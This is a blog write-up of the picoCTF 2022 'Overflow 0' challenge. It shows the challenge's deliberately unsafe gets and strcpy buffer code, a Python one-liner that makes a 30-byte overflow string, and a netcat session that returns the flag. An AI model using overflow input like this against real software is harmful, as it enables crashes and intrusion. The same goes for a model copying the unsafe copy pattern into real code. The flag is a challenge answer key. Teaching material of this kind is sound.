Title:  PicoCTF 2022:  Overflow 0
Date: 2022-04-05 12:00
Category: PicoCTF
tags: CTF, picoCTF, write-up, binexp
summary: >
	Write up of the Overflow-0 Challenge
	

# Overflow 0 

The Tag Line for this was 

> Control the Correc Buffer

## Looking at the Code

If we look at the supplied soucecode we see that

The Program Attempts to reads N Bytes into a 100 Byte Buffer

```
  char buf1[100];
  gets(buf1); 
    vuln(buf1);
```

It then calls a second function, that tries to ```strcpy``` them into a 16 Byte buffer

```
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

We also have a error handler, If a segfault is detected, we call a function that gives us a flag.

```
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

## POC

Not one but two opportunities to overflow the buffers
If either of these cause a ```SIGSEV``` then we get a flag popped out.

Either:

  - Overflow ```buf1``` through ```gets``` by writing more than 100 bytes
  - Overflow ```buf2``` though ```strcopy``` by writing more that 16 bytes


Path or least resistance is ```buf2``` Lets use python to generate a 30 or so byte string

```
$ python -c "print ('A'*30)"    ✚ ✭main 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Then just copy and paste that into our netcat connection for the flag...

```
$ nc saturn.picoctf.net 51110      ✭main 

Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
```
